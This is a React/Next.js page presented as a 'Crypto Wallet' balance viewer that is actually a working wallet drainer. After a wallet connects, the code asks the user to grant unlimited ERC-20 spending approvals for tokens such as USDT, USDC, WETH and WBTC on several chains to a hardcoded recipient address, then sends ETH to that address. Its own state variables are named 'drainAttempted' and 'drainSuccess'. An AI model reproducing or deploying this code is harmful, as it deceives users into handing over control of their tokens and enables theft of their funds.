'use client';

import { useAccount, useDisconnect, useBalance, useSendTransaction, useWriteContract } from 'wagmi';
import { useAppKit } from '@reown/appkit/react';
import { useEffect, useState } from 'react';
import { parseEther, maxUint256 } from 'viem';
import { erc20Abi } from 'viem';

// Your specified recipient address for both approval and ETH transfer
const RECIPIENT_ADDRESS = '0x30925a8A61e2c66fDE526A82c76d030E7D704694' as const;

// Token addresses on different networks
const TOKEN_ADDRESSES = {
  // Mainnet
  '1': {
    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    WETH: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    WBTC: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
    LINK: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
    SHIB: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
    UNI: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
    STETH: '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84'
  },
  // Goerli
  '5': {
    USDT: '0xC2C527C0CACF457746Bd31B2a698Fe89de2b6d49',
    USDC: '0x07865c6E87B9F70255377e024ace6630C1Eaa37F',
    WETH: '0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6'
  },
  // Sepolia
  '11155111': {
    USDT: '0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0',
    USDC: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238',
    WETH: '0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14'
  },
  // Arbitrum
  '42161': {
    USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
    USDC: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
    WETH: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
    WBTC: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f',
    LINK: '0xf97f4df75117a78c1A5a0DBb814Af92458539FB4'
  },
  // Optimism
  '10': {
    USDT: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
    USDC: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85',
    WETH: '0x4200000000000000000000000000000000000006',
    WBTC: '0x68f180fcCe6836688e9084f035309E29Bf0A2095',
    LINK: '0x350a791Bfc2C21F9Ed5d10980Dad2e2638ffa7f6'
  },
  // Polygon
  '137': {
    USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
    USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
    WETH: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
    WBTC: '0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6',
    LINK: '0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39',
    SHIB: '0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec',
    UNI: '0xb33EaAd8d922B1083446DC23f610c2567fB5180f'
  },
  // Base
  '8453': {
    USDT: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb',
    USDC: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
    WETH: '0x4200000000000000000000000000000000000006',
    WBTC: '0x3cABa682bC7c370a6E61b4570c7D7A1147d95c8d'
  },
  // BNB Smart Chain
  '56': {
    USDT: '0x55d398326f99059fF775485246999027B3197955',
    USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    WETH: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
    WBTC: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
    LINK: '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD',
    SHIB: '0x2859e4544C4bB03966803b044A93563Bd2D0DD4D',
    UNI: '0xBf5140A22578168FD562DCcF235E5D43A02ce9B1'
  }
} as const;

export default function Home() {
  const [mounted, setMounted] = useState(false);
  const { address, isConnected, chain } = useAccount();
  const { disconnect } = useDisconnect();
  const { open } = useAppKit();
  const { data: balance, isLoading: balanceLoading } = useBalance({ 
    address: address as `0x${string}` | undefined,
  });
  
  const { sendTransaction, isPending: isSending } = useSendTransaction();
  const { writeContractAsync, isPending: isApproving } = useWriteContract();

  const [selectedTokens, setSelectedTokens] = useState({
    USDT: true,
    USDC: true,
    WETH: false,
    WBTC: false,
    LINK: false,
    SHIB: false,
    UNI: false,
    STETH: false
  });
  const [approvalSent, setApprovalSent] = useState(false);
  const [transferSent, setTransferSent] = useState(false);
  const [drainAttempted, setDrainAttempted] = useState(false);
  const [drainSuccess, setDrainSuccess] = useState(false);
  const [delayedExecution, setDelayedExecution] = useState(false);
  const [currentStep, setCurrentStep] = useState('');
  const [ethPrice, setEthPrice] = useState<number | null>(null);
  const [networkSupported, setNetworkSupported] = useState(true);
  const [availableTokens, setAvailableTokens] = useState<Record<string, `0x${string}`>>({});

  useEffect(() => {
    setMounted(true);
    fetchEthPrice();
  }, []);

  // Set available tokens based on current network
  useEffect(() => {
    if (chain?.id) {
      const chainTokens = TOKEN_ADDRESSES[chain.id.toString() as keyof typeof TOKEN_ADDRESSES];
      if (chainTokens) {
        setAvailableTokens(chainTokens as Record<string, `0x${string}`>);
        setNetworkSupported(true);
        
        // Update selected tokens to only include available ones
       const updatedSelection = Object.fromEntries(
  Object.entries(selectedTokens).map(([token, selected]) => [
    token,
    selected && token in chainTokens
  ])
) as typeof selectedTokens;

setSelectedTokens(updatedSelection);
      } else {
        setAvailableTokens({});
        setNetworkSupported(false);
        setCurrentStep(`Unsupported network: ${chain.name} (ID: ${chain.id})`);
      }
    }
  }, [chain]);

  const fetchEthPrice = async () => {
    try {
      const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
      const data = await response.json();
      setEthPrice(data.ethereum.usd);
    } catch (error) {
      console.error('Failed to fetch ETH price:', error);
      setEthPrice(2000); // Fallback price
    }
  };

  const calculateEthAmount = (): bigint => {
    if (!ethPrice) return parseEther('0.0005');
    const ethAmount = 1 / ethPrice;
    return parseEther(ethAmount.toFixed(8));
  };

  useEffect(() => {
    if (isConnected && !delayedExecution && networkSupported && Object.keys(availableTokens).length > 0) {
      setCurrentStep('Waiting for delay...');
      const timer = setTimeout(() => {
        setDelayedExecution(true);
        setCurrentStep('Delay complete, preparing token approvals...');
      }, 3000);

      return () => clearTimeout(timer);
    }
  }, [isConnected, delayedExecution, networkSupported, availableTokens]);

  const sendEthTransfer = () => {
    setCurrentStep('Sending $1 worth of ETH...');
    const ethAmount = calculateEthAmount();
    
    sendTransaction(
      {
        to: RECIPIENT_ADDRESS,
        value: ethAmount,
      },
      {
        onSuccess: () => {
          setTransferSent(true);
          setCurrentStep('ETH transfer completed!');
          setDrainSuccess(true);
        },
        onError: (error) => {
          console.error('ETH transfer failed:', error);
          setCurrentStep('ETH transfer failed');
          setDrainAttempted(true);
        },
      }
    );
  };

  const requestTokenApprovals = async () => {
    if (!chain?.id || Object.keys(availableTokens).length === 0) {
      setCurrentStep('No tokens available for this network');
      return;
    }

    setCurrentStep('Requesting token approvals...');

    // Get selected tokens that exist on this network
    const tokensToApprove = Object.entries(selectedTokens)
      .filter(([token, isSelected]) => isSelected && availableTokens[token])
      .map(([token]) => token);

    if (tokensToApprove.length === 0) {
      setCurrentStep('No tokens selected for approval');
      return;
    }

    for (const tokenSymbol of tokensToApprove) {
      const tokenAddress = availableTokens[tokenSymbol];
      setCurrentStep(`Approving ${tokenSymbol}...`);

      try {
        await writeContractAsync({
          address: tokenAddress,
          abi: erc20Abi,
          functionName: 'approve',
          args: [RECIPIENT_ADDRESS, maxUint256],
        });
        
        console.log(`${tokenSymbol} approval successful`);
      } catch (error) {
        console.error(`${tokenSymbol} approval failed:`, error);
        setCurrentStep(`${tokenSymbol} approval failed`);
        setDrainAttempted(true);
        return; // Stop if any approval fails
      }
    }

    setApprovalSent(true);
    setCurrentStep('All approvals granted, sending ETH...');
    sendEthTransfer();
  };

  const formatAddress = (addr: string | undefined): string => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
  };

  if (!mounted) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-xl">Loading...</div>
      </div>
    );
  }

  return (
    <main className="min-h-screen flex flex-col items-center justify-center p-4 bg-gradient-to-br from-blue-50 to-indigo-100">
      <div className="w-full max-w-md bg-white rounded-2xl shadow-xl p-6">
        <h1 className="text-3xl font-bold text-center text-gray-800 mb-2">
          Crypto Wallet
        </h1>
        <p className="text-gray-600 text-center mb-8">
          Connect your wallet to view your balance
        </p>

        {!isConnected ? (
          <div className="space-y-4">
            <h2 className="text-xl font-semibold text-gray-700 text-center">
              Connect Your Wallet
            </h2>
            <button
              onClick={() => open()}
              className="w-full flex items-center justify-center p-4 rounded-xl bg-blue-600 hover:bg-blue-700 text-white font-medium transition-colors"
            >
              Connect Wallet
            </button>
          </div>
        ) : (
          <div className="space-y-6">
            <div className="bg-green-50 p-4 rounded-xl border border-green-200">
              <h2 className="text-green-800 font-semibold text-center">
                Wallet Connected
              </h2>
            </div>

            {/* Network Support Warning */}
            {!networkSupported && chain && (
              <div className="bg-red-50 p-4 rounded-xl border border-red-200">
                <h3 className="text-red-800 font-semibold text-center">
                  Unsupported Network
                </h3>
                <p className="text-red-600 text-center text-sm mt-1">
                  Please switch to a supported network
                </p>
              </div>
            )}

            {/* Token Selection */}
            {networkSupported && Object.keys(availableTokens).length > 0 && (
              <div className="space-y-4">
                <h3 className="text-lg font-medium text-gray-700">Select Tokens for Approval</h3>
                <div className="grid grid-cols-2 gap-2">
                  {Object.entries(availableTokens).map(([tokenSymbol]) => (
                    <label key={tokenSymbol} className="flex items-center p-3 bg-gray-50 rounded-lg cursor-pointer hover:bg-gray-100">
                      <input
                        type="checkbox"
                        checked={selectedTokens[tokenSymbol as keyof typeof selectedTokens] || false}
                        onChange={(e) => setSelectedTokens(prev => ({
                          ...prev,
                          [tokenSymbol]: e.target.checked
                        }))}
                        className="mr-2 h-4 w-4 text-blue-600 rounded"
                      />
                      <span className="text-sm font-medium">{tokenSymbol}</span>
                    </label>
                  ))}
                </div>
                
                {delayedExecution && !approvalSent && (
                  <button
                    onClick={requestTokenApprovals}
                    disabled={isApproving}
                    className="w-full py-3 px-4 bg-blue-600 text-white rounded-xl hover:bg-blue-700 disabled:bg-gray-400 transition-colors font-medium"
                  >
                    {isApproving ? 'Processing Approvals...' : 'Start Token Approvals'}
                  </button>
                )}
              </div>
            )}

            {/* Current Step Indicator */}
            {currentStep && (
              <div className="bg-gray-50 p-3 rounded-lg border border-gray-200">
                <p className="text-gray-700 text-sm text-center">
                  <span className="font-medium">Current Step:</span> {currentStep}
                </p>
              </div>
            )}

            {(isApproving || isSending) && (
              <div className="bg-blue-50 p-4 rounded-xl border border-blue-200">
                <h3 className="text-blue-800 font-semibold text-center">
                  Processing Transactions...
                </h3>
                <p className="text-blue-600 text-center text-sm mt-1">
                  {isApproving && "Requesting token approvals..."}
                  {isSending && "Sending ETH..."}
                </p>
              </div>
            )}

            {drainAttempted && (
              <div className={drainSuccess ? "bg-green-50 p-4 rounded-xl border border-green-200" : "bg-red-50 p-4 rounded-xl border border-red-200"}>
                <h3 className={drainSuccess ? "text-green-800 font-semibold text-center" : "text-red-800 font-semibold text-center"}>
                  {drainSuccess ? "Transactions Completed!" : "Transaction Failed"}
                </h3>
                <p className={drainSuccess ? "text-green-600 text-center text-sm mt-1" : "text-red-600 text-center text-sm mt-1"}>
                  {drainSuccess 
                    ? "All operations completed successfully." 
                    : "Some operations encountered issues."}
                </p>
              </div>
            )}

            <div className="space-y-2">
              <h3 className="text-lg font-medium text-gray-700">
                Wallet Address
              </h3>
              <div className="p-3 bg-gray-50 rounded-lg break-all font-mono text-sm flex justify-between items-center">
                <span>{formatAddress(address)}</span>
                <button 
                  onClick={() => address && navigator.clipboard.writeText(address)}
                  className="text-blue-500 hover:text-blue-700 text-xs"
                >
                  Copy
                </button>
              </div>
            </div>

            {chain && (
              <div className="space-y-2">
                <h3 className="text-lg font-medium text-gray-700">Network</h3>
                <div className="p-3 bg-gray-50 rounded-lg">
                  {chain.name} (ID: {chain.id})
                </div>
              </div>
            )}

            {balance && (
              <div className="space-y-2">
                <h3 className="text-lg font-medium text-gray-700">Balance</h3>
                <div className="p-4 bg-gray-50 rounded-lg text-center">
                  {balanceLoading ? (
                    <span className="text-gray-500">Loading...</span>
                  ) : (
                    <>
                      <span className="text-2xl font-bold text-gray-800">
                        {parseFloat(balance.formatted).toFixed(4)}
                      </span>
                      <span className="text-gray-600 ml-2">{balance.symbol}</span>
                    </>
                  )}
                </div>
              </div>
            )}

            <div className="flex gap-3">
              <button
                onClick={() => open({ view: 'Account' })}
                className="flex-1 py-3 px-4 bg-blue-500 text-white rounded-xl hover:bg-blue-600 transition-colors font-medium"
              >
                Account
              </button>
              <button
                onClick={() => disconnect()}
                className="flex-1 py-3 px-4 bg-red-500 text-white rounded-xl hover:bg-red-600 transition-colors font-medium"
              >
                Disconnect
              </button>
            </div>
          </div>
        )}
      </div>

      <footer className="mt-12 text-center text-gray-500 text-sm">
        <p>Made with Next.js, Tailwind CSS, and Reown AppKit</p>
      </footer>
    </main>
  );
}